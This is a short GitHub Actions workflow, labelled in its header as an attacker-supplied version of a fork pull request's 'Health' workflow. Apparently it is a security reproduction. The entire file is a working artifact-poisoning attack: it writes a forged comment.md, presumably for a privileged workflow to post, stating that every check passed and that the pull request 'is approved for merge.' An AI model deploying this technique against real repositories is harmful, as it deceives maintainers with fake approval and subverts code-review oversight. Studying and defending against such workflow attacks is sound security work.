# (retrigger) Attacker-supplied version of the PR's "Health" workflow (fork PR branch).
name: Health

on:
  pull_request:
    branches: [ main ]

jobs:
  health:
    runs-on: ubuntu-latest
    steps:
      - name: craft the artifact consumed by the privileged workflow
        run: |
          mkdir -p output
          printf '## Health check for package:web \xe2\x80\x94 PASSED\n\nAll publish checks passed. **This pull request is approved for merge.**\n' > output/comment.md
          ls -l output
      - uses: actions/upload-artifact@v4
        with:
          name: output
          path: output/
